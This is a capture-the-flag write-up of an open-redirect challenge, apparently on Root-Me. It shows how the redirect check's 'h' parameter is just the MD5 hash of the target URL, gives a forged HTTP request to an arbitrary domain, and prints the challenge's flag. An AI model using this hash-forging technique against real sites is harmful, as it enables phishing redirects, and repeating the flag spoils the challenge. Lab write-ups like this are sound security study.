---
custom_edit_url: null
sidebar_position: 3
---

> Find a way to make a redirection to a domain other than those showed on the web page.

![1](https://github.com/Knign/Write-ups/assets/110326359/ee04fb63-1a0b-46ac-a2b7-cdb6e2a69256)

We can click on any of the options and intercept the request using Burpsuite.

![2](https://github.com/Knign/Write-ups/assets/110326359/45b55aeb-161a-43da-8d32-99d0baa03cd2)

```
GET /web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134 HTTP/1.1
```
The request would typically be processed by a web server, which would attempt to access the specified URL (in this case, `https://facebook.com`) and respond accordingly.

The `h` parameter may be some form of hash used for the purpose of authentication.

Let's decode the hash using an online decoder.

![3](https://github.com/Knign/Write-ups/assets/110326359/2952d985-90bb-4b05-82d8-d6460838e430)

So the MD5 hashing function was used to encode `https://facebook.com` and the hash was then included in the `h` parameter.

Let's say we want to redirect to `https://openredirect.com`, we would have to set the `h` parameter to the hash of the `url` parameter.

![4](https://github.com/Knign/Write-ups/assets/110326359/fd1bf08c-ce6b-4bd6-ae4f-1a555e190ef2)

## HTTP Request
```
GET /web-serveur/ch52/?url=https://openredirect.com&h=467e5d669ea35a18601efe9bb20f52ad HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org/web-serveur/ch52/
DNT: 1
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1697302688.4.1.1697302689.0.0.0; _ga=GA1.1.1863804672.1697290591
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```
For the final step, we have to send this request to the server.

![5](https://github.com/Knign/Write-ups/assets/110326359/49a20eec-87a0-4456-b0ce-b78328931dcf)

## Flag
```
e6f8a530811d5a479812d7b82fc1a5c5
```
